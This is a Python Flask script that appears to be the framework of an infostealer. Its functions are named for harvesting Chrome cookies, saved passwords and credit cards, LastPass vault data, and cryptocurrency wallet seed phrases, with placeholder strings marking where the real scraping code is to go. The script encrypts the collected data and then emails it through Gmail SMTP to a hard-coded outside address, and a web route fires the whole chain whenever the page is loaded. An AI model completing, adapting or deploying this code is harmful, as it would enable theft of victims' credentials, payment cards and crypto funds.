from flask import Flask
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Global key for encryption (to be used for both encrypt and decrypt functions)
key = os.urandom(32)  # Generate a random 256-bit key (this should be securely stored in a real application)

# Function to encrypt data
def encrypt_data(data):
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(cipher.iv + ciphertext).decode('utf-8')

# Function to decrypt data
def decrypt_data(encrypted_data):
    encrypted_data = base64.b64decode(encrypted_data.encode('utf-8'))
    iv = encrypted_data[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data[AES.block_size:]), AES.block_size)
    return decrypted_data.decode('utf-8')

# Function to install browser extensions (adjusted for Render deployment)
def install_extensions():
    # In the Render environment, you cannot use sudo to install system packages. You may need
    # to install extensions manually via browser or manage them in your local environment.
    # Thus, this function would be omitted for deployment on Render.
    pass

# Function to scrape data from Chrome (replace with actual scraping code if needed)
def scrape_chrome_data():
    # Example data (replace with real scraping logic)
    cookies = "example_cookie_data"
    passwords = "example_password_data"
    credit_cards = "example_credit_card_data"
    # Store the scraped data in a file
    data = f"Cookies:\n{cookies}\nPasswords:\n{passwords}\nCredit Cards:\n{credit_cards}"
    encrypted_data = encrypt_data(data)
    with open("chrome_scraped_data.txt", "w") as file:
        file.write(encrypted_data)

# Function to scrape data from Lastpass (replace with actual scraping code if needed)
def scrape_lastpass_data():
    # Example data (replace with real scraping logic)
    passwords = "example_lastpass_passwords"
    credit_cards = "example_lastpass_credit_cards"
    # Store the scraped data in a file
    data = f"Passwords:\n{passwords}\nCredit Cards:\n{credit_cards}"
    encrypted_data = encrypt_data(data)
    with open("lastpass_scraped_data.txt", "w") as file:
        file.write(encrypted_data)

# Function to scrape cryptocurrency wallet data (replace with actual scraping code if needed)
def scrape_crypto_data():
    # Example data (replace with real scraping logic)
    wallet_address = "example_wallet_address"
    seed_phrase = "example_seed_phrase"
    # Store the scraped data in a file
    data = f"Wallet Address:\n{wallet_address}\nSeed Phrase:\n{seed_phrase}"
    encrypted_data = encrypt_data(data)
    with open("crypto_scraped_data.txt", "w") as file:
        file.write(encrypted_data)

# Function to send the scraped data to your email
def send_email(file_path, recipient_email, data):
    sender_email = "your_email@example.com"
    password = "your_email_password"

    # Create a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient_email
    message["Subject"] = "Scraped Data"

    # Attach the data to the message
    message.attach(MIMEText(data, "plain"))

    # Send the email
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient_email, message.as_string())

# Main function
def main():
    install_extensions()  # In cloud environments like Render, you may not be able to install extensions
    scrape_chrome_data()
    scrape_lastpass_data()
    scrape_crypto_data()

    # Sending emails with the decrypted content of the scraped data
    with open("chrome_scraped_data.txt", "r") as file:
        encrypted_data = file.read()
    decrypted_data = decrypt_data(encrypted_data)
    send_email("chrome_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)

    with open("lastpass_scraped_data.txt", "r") as file:
        encrypted_data = file.read()
    decrypted_data = decrypt_data(encrypted_data)
    send_email("lastpass_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)

    with open("crypto_scraped_data.txt", "r") as file:
        encrypted_data = file.read()
    decrypted_data = decrypt_data(encrypted_data)
    send_email("crypto_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)

app = Flask(__name__)

@app.route('/')
def run_script():
    # Call the main function of the script
    main()
    return "Script executed successfully"

if __name__ == '__main__':
    app.run(debug=True)
